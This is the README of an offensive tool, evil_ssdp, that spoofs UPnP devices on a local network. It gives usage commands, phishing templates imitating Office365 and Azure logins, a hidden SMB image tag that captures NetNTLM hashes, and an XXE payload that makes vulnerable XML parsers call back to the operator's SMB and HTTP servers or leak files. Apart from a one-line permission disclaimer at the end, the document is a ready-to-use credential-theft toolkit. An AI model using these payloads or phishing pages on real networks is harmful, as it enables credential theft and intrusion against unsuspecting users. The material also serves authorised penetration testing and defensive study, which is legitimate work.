# Overview
This tool responds to SSDP multicast discover requests, posing as a generic UPNP device. Your spoofed device will magically appear in Windows Explorer on machines in your local network. Users who are tempted to open the device are shown a configurable phishing page. This page can load a hidden image over SMB, allowing you to capture or relay the NetNTLM challenge/response.

Templates are also provided to capture clear-text credentials via basic authentication and logon forms, and creating your own custom templates is quick and easy.

This requires no existing credentials to execute and works even on networks that have protected against Responder attacks by disabling NETBIOS and LLMNR. Any Operating System or application leveraging SSDP/UPNP can be targeted, but most of the current weaponization has been aimed at Windows 10.

[Video: Phishing Overview](https://filedn.com/lawDInIqGS3h9zy6QM1YNQQ/essdp-phishing.mp4)

As a bonus, this tool can also detect and exploit potential zero-day vulnerabilities in the XML parsing engines of applications using SSDP/UPNP. If a vulnerable device is found, it will alert you in the UI and then mount your SMB share or exfiltrate data with NO USER INTERACTION REQUIRED via an XML External Entity (XXE) attack. 

[Video: 0-Day Overview](https://filedn.com/lawDInIqGS3h9zy6QM1YNQQ/essdp-0days.mp4)

# Usage
The most basic run looks like this:

```
evil_ssdp.py eth0
```

You need to provide the network interface at a minimum. The interface is used for both the UDP SSDP interaction as well as hosting a web server for the XML files and phishing page.

The tool will automatically update an IMG tag in the phishing page using the IP of the interface you provide. To work with challenge/response, you'll need to launch an SMB server at that interface (like Impacket). This address can be customized with the `-s` option. 

Some example scenarios:

```
# Use wlan0 for device advertisement and phishing, capturing NetNTLM and
# asking for clear-text via a spoofed Office365 logon form. Redirect to
# Microsoft aftering capturing credentials:
evil_ssdp.py wlan0 -t office365 -u 'https://office.microsoft.com'

# Same as above, but assuming your SMB server is running on another IP:
evil_ssdp.py wlan0 -t office365 -u 'https://office.microsoft.com' \
    -s 192.168.1.205

# Prompt for creds using basic auth and redirect to Azure:
evil_ssdp.py wlan0 -t microsoft-azure -u \
    'https://azure.microsoft.com/auth/signin/' -b

# Hope for an XXE vul to capture NetNTLM while Impacket/Responder is running
on wlan0:
evil_ssdp.py wlan0 -t xxe-smb
```

Full usage details:

```
usage: evil_ssdp.py [-h] [-p PORT] [-t TEMPLATE] [-s SMB] [-b] [-r REALM]
                    [-u URL]
                    interface

positional arguments:
  interface             Network interface to listen on.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port for HTTP server. Defaults to 8888.
  -t TEMPLATE, --template TEMPLATE
                        Name of a folder in the templates directory. Defaults
                        to "office365". This will determine xml and phishing
                        pages used.
  -s SMB, --smb SMB     IP address of your SMB server. Defalts to the primary
                        address of the "interface" provided.
  -b, --basic           Enable base64 authentication for templates and write
                        credentials to log file.
  -r REALM, --realm REALM
                        Realm when prompting target for authentication via
                        Basic Auth.
  -u URL, --url URL     Redirect to this URL. Works with templates that do a
                        POST for logon forms and with templates that include
                        the custom redirect JavaScript (see README for more
                        info).[example: -r https://google.com]
  -a, --analyze         Run in analyze mode. Will NOT respond to any SSDP
                        queries, but will still enable and run the web server
                        for testing.
```

# Templates
The following templates come with the tool. If you have good design skills, please contribute one of your own!

- `office365`:          Will show up in Windows Explorer as "Office365 Backups". Phishing page looking like Office365 logon will POST credentials back to you. These will be flagged in the UI and logged in the log file. Recommend to run with '-u https://www.office.com' to redirect users to the legit site after stealing their credentials. Developer: [pentestgeek](https://github.com/pentestgeek/phishing-frenzy-templates).
- `scanner`:            Will show up in Windows Explorer as a scanner with the name "Corporate Scanner [3 NEW SCANS WAITING]". Double-clicking will bring to a generic looking logon page. This template would do well with customization for your particular target. Template mostly copied from [this template](http://codepen.io/miroot/pen/qwIgC).
- `microsft-azure`:     Will appear in Windows Explorer as "Microsoft Azure Storage". Landing page is the Windows Live login page when cookies are disabled. Recommend to use with the -u option to redirect users to real login page. Developer: [Dwight Hohnstein](https://github.com/djhohnstein).
- `bitcoin`:            Will show up in Windows Explorer as "Bitcoin Wallet". Phishing page is just a random set of Bitcoin private/public/address info. There are no actual funds in these accounts.
- `password-vault`:     Will show up in Windows Explorer as "IT Password Vault". Phishing page contains a short list of fake passwords / ssh keys / etc.
- `xxe-smb`:            Will not likely show up in Windows Explorer. Used for finding zero day vulnerabilities in XML parsers. Will trigger an "XXE - VULN" alert in the UI for hits and will attempt to force clients to authenticate with the SMB server, with 0 interaction.
- `xxe-exfil`:          Another example of searching for XXE vulnerabilities, but this time attempting to exfiltrate a test file from a Windows host. Of course you can customize this to look for whatever specific file you are after, Windows or Linux. In the vulnerable applications I've discovered, exfiltration works only on a file with no whitepace or linebreaks. This is due to how it is injected into the URL of a GET request. If you get this working on multi-line files, PLEASE let me know how you did it.

Creating your own templates is easy. Simply copy the folder of an existing template and edit the following files:
- `device.xml`:         Here is where you will define what the device looks like inside Windows Explorer.
- `present.html`:       This is the phishing page displayed when a target opens the evil device. Craft anything you like here. Note that Python's string template will parse this, so you will need to use `$$` in place of `$` anywhere to escape the template engine.
- `service.xml`:        Not yet implemented. May be needed for more complex UPNP spoofing in the future.

In your phishing page (`present.html`), use variables like the following for additional functionality:

```
# The following line will initiate a NetNTLM challenge/response using the IP
# address of either the interface you provide or an optionally specified IP
# address:
<img src="file://///$smb_server/smb/hash.jpg" style="display: none;" />

# The following will leverage optionally specified URL redirection. This is
# handy when used with basic authentication to redirect to a valid site. This
# line is built in to the microsoft-azure template:
    <script>
	    var url = "$redirectUrl";
    	    if (url != "") {
	    	document.location = url;
	    }
    </script>


# If using an HTTP form to capture clear-text credentials, use code like the
# following. Also any template doing a POST request will automatically
# support the '-u' parameter to redirect after the POST completes.  The tool
# will monitor POSTs to this URL for credentials:
<form method="POST" action="/ssdp/do_login.html" name="LoginForm">
```

The tool currently only correctly creates devices for the UPNP 'Basic' device type, although it is responding to the SSDP queries for all devices types. If you know UPNP well, you can create a new template with the correct parameters to fufill requests for other device types as well. There is still a lot to explore here with exploiting specific applications and the way they expect and leverage UPNP devices.

# Technical Details
Simple Service Discovery Protocol (SSDP) is used by Operating Systems (Windows, MacOS, Linux, IOS, Android, etc) and applications (Spotify, Youtube, etc) to discover shared devices on a local network. It is the foundation for discovering and advertising Universal Plug & Play (UPNP) devices.

Devices attempting to discover shared network resources will send a UDP multicast out to 239.255.255.250 on port 1900. The source port is randomized. An example request looks like this:
```
M-SEARCH * HTTP/1.1
Host: 239.255.255.250:1900
ST: upnp:rootdevice
Man: "ssdp:discover"
MX: 3
```

To interact with this host, we need to capture both the source port and the 'ST' (Service Type) header. The response MUST be sent to the correct source port and SHOULD include the correct ST header. Note that it is not just the Windows OS looking for devices - scanning a typical network will show a large amount of requests from applications inside the OS (like Spotify), mobile phones, and other media devices. Windows will only play ball if you reply with the correct ST, other sources are more lenient.

evil_ssdp will extract the requested ST and send a reponse like the following:

```
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=1800
DATE: Tue, 16 Oct 2018 20:17:12 GMT
EXT:
LOCATION: http://192.168.1.214:8888/ssdp/device-desc.xml
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01
01-NLS: uuid:7f7cc7e1-b631-86f0-ebb2-3f4504b58f5c
SERVER: UPnP/1.0
ST: upnp:rootdevice
USN: uuid:7f7cc7e1-b631-86f0-ebb2-3f4504b58f5c::upnp:rootdevice
BOOTID.UPNP.ORG: 0
CONFIGID.UPNP.ORG: 1
```

The headers (specifically LOCATION, 01-NLS, ST, and USN) are constructed dynamically. This tells the requestor where to find more information about our device. Here, we are forcing Windows (and other requestors) to access our 'Device Descriptor' xml file and parse it. The USN is just a random string and needs only to be unique and formatted properly.

evil_ssdp will pull the 'device.xml' file from the chosen templates folder and dynamically plug in some variables such as your IP address. This 'Device Descriptor' file is where you can customize some juicy-sounding friendly names and descriptions. It looks like this:

```
<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
  <specVersion>
    <major>1</major>
    <minor>0</minor>
  </specVersion>
  <URLBase>http://$local_ip:$local_port</URLBase>
  <device>
    <presentationURL>http://$local_ip:$local_port/present.html</presentationURL>
    <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
    <friendlyName>Office365 Backups</friendlyName>
    <modelDescription>Secure Storage for Office365</modelDescription>
    <manufacturer>MS Office</manufacturer>
    <modelName>Office 365 Backups</modelName>
    <UDN>$session_usn</UDN>
    <serviceList>
      <service>
        <serviceType>urn:schemas-upnp-org:device:Basic:1</serviceType>
        <serviceId>urn:schemas-upnp-org:device:Basic</serviceId>
        <controlURL>/ssdp/service-desc.xml</controlURL>
        <eventSubURL>/ssdp/service-desc.xml</eventSubURL>
        <SCPDURL>/ssdp/service-desc.xml</SCPDURL>
      </service>
    </serviceList>

  </device>
</root>
```

A key line in this file contains the 'Presentation URL'. This is what will load in a user's browser if they decide to manually double-click on the UPNP device. evil_ssdp will host this file automatically (present.html from the chosen template folder), plugging in your source IP address into an IMG tag to access an SMB share that you can host with tools like [Impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket), [Responder](https://github.com/SpiderLabs/Responder), or [Metasploit](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb).

The IMG tage looks like this:

```
<img src="file://///$local_ip/smb/hash.jpg" style="display: none;" /><br>
```

# Zero-Day Hunting
By default, this tool essentially forces devices on the network to parse an XML file. A well-known attack against applications that parse XML exists - [XML External Entity Processing (XXE)](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing).

This type of attack against UPNP devices in likely overlooked - simply because the attack method is complex and not readily apparent. However, evil_ssdp makes it very easy to test for vulnerable devices on your network. Simply run the tool and look for a big `[XXE VULN!!!]` in the output. NOTE: using the xxe template will likely not spawn visibile evil devices across the LAN, it is meant only for zero-interaction scenarios.

This is accomplished by providing a Device Descriptor XML file with the following content:

```
<?xml version="1.0"?>
<!DOCTYPE data [ 
<!ENTITY xxe SYSTEM "file://///$smb_server/smb/hash.jpg" >
<!ENTITY xxe-url SYSTEM "http://$local_ip:$local_port/ssdp/xxe.html" >
]>
<data>&xxe;&xxe-url;</data>
```

When a vulnerable XML parser reads this file, it will automatically mount the SMB share (allowing you to crack the hash or relay) as well as access an HTTP URL to notify you it was discovered. The notification will contain the HTTP headers and an IP address, which should give you some info on the vulnerable application. If you see this, please do contact the vendor to fix the issue. Also, I would love to hear about any zero days you find using the tool. And please do mention the tool in your CVE.


# Thanks
- Thanks to ZeWarren and his project [here](https://github.com/ZeWaren/python-upnp-ssdp-example). I used this extensively to understand how to get the basics for SSDP working.
- Thanks to the pentest geek and their phishing templates [here](https://github.com/pentestgeek/phishing-frenzy-templates). I used the Office365 login page from there.
- Thanks to [Dwight Hohnstein](https://github.com/djhohnstein) for his great work to implement cool features like basic authentication, realm support, and automatic redirection in evil_ssdp. He kindly wrote and provided code to make this work.
- Thanks to the following folks for submitting bugfixes:
    - Nadar, Ender Akbas, bubbleguuum

Also thanks to Microsoft for developing lots of fun insecure things to play with.

*This is a security research tool. Use only where granted explicit permission from the network owner.*
